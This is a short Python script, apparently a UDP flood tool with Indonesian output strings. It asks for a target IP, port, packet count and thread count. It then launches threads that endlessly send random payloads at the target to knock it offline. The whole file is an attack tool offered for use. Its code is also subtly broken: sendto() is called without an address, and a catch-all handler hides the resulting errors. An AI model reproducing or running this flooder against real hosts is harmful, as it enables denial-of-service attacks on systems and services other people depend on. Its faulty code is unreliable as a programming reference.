import random
import socket
import threading
import os,sys

os.system("clear")
print("hengker disini")

p1 = str(input("IP  : "))
p2 = int(input("PORT  : "))
p3 = int(input("PAKET : "))
p4 = int(input("BONUS PAKETAN : "))
os.system("clear")
def Zarir():
    H4N5 = random._urandom(1180)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(H4N5)
            for x in range(p3):
                s.sendto(H4N5)
            print("TEMBUS????")
        except:
            print("Down!!!!")

def Zarir2():
    H4N5 = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(H4N5)
            for x in range(p3):
                s.sendto(H4N5)
            print("TEMBUS????")
        except:
            print("Down!!")

def Zarir3():
    H4N5 = random._urandom(1900)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(H4N5)
            for x in range(p3):
                s.sendto(H4N5)
            print("TEMBUS????")
        except:
            print("Down!!!")
            
for y in range(p4):
    th = threading.Thread(target=Zarir)
    th.start()
    th = threading.Thread(target=Zarir2)
    th.start()
    th = threading.Thread(target=Zarir3)
    th.start()